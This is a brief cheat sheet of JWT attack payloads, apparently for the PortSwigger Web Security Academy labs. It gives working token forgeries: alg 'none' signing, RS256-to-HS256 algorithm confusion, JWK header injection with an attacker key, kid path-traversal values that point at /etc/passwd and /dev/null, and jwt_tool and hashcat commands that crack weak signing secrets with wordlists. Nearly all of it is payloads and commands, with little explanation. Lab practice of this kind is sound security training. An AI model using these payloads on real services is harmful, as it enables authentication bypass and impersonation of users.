# PortSwigger JWT Labs — Complete Reference

## None Algorithm
```python
import jwt
# Token with alg: "none" and empty signature
jwt.encode({"user":"admin"},"",algorithm="none")
```

## Algorithm Confusion
1. Get public key from server (e.g., `/jwks.json`, `/well-known/jwks.json`)
2. Change algorithm from `RS256` to `HS256`
3. Sign with public key as HMAC secret
4. Server verifies with HS256 using same key

## JWK Injection
Send crafted JWK in header:
```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "kid": "attacker-id",
    "n": "ATTACKER_RSA_PUBLIC_KEY_MODULUS",
    "e": "AQAB"
  },
  "typ": "JWT"
}
```

## kid Injection (Path Traversal)
```json
{"kid":"../../../etc/passwd","alg":"HS256","typ":"JWT"}
{"kid":"/dev/null","alg":"None"}  
```

## Brute Force Weak Secret
```bash
jwt_tool JWT_TOKEN -C -d rockyou.txt
python3 jwtcrack.py JWT_TOKEN
hashcat -m 16500 JWT_TOKEN wordlist.txt
```
